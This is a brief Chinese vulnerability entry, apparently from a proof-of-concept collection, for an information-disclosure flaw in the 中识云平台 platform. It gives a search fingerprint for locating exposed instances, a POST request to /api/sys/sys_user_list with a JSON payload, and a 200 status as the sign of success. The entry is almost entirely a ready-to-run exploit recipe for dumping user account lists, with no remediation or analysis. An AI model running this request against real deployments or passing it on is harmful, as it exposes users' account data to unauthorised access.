# 中识云平台sys_user_list存在信息泄露漏洞

中识云平台 ｜ 信息泄露 ｜ —
- **指纹**：`title="中识云平台"`
- **请求**：`POST /api/sys/sys_user_list?userName=admin HTTP/1.1`

**Payload**
```
{"page":1,"limit":10,"username":""}
```
- **响应特征**：200